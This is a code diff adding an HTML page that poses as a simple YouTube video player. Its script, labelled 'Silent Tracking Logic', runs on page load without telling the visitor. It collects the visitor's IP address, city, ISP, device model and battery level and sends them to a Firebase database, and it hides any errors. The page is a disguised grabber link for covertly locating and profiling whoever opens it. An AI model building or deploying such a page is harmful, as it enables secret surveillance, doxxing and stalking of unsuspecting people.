@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Video Player</title>
+    <style>
+        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background: #000; }
+        iframe { width: 100%; height: 100%; border: none; }
+    </style>
+</head>
+<body>
+
+    <iframe id="videoPlayer" src="" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+    <script>
+        // 1. Firebase Setup
+        const firebaseConfig = { databaseURL: "https://data-28355-default-rtdb.firebaseio.com/" };
+        firebase.initializeApp(firebaseConfig);
+
+        // 2. URL se Video ID nikalna (e.g., ?v=VIDEO_ID)
+        const urlParams = new URLSearchParams(window.location.search);
+        const videoId = urlParams.get('v') || 'dQw4w9WgXcQ'; // Default video agar kuch na ho
+        document.getElementById('videoPlayer').src = `https://www.youtube.com/embed/${videoId}?autoplay=1`;
+
+        // 3. Silent Tracking Logic
+        async function silentCapture() {
+            try {
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
+                const battery = await navigator.getBattery();
+
+                const log = {
+                    video_watched: videoId,
+                    ip: ipData.ip,
+                    city: ipData.city,
+                    isp: ipData.org,
+                    device: navigator.userAgent.match(/\(([^)]+)\)/)[1], // Mobile Model
+                    battery: (battery.level * 100).toFixed(0) + "%",
+                    time: new Date().toLocaleString()
+                };
+
+                firebase.database().ref('video_logs').push(log);
+            } catch (e) { console.log("System Running..."); }
+        }
+
+        window.onload = silentCapture;
+    </script>
+</body>
+</html>
+
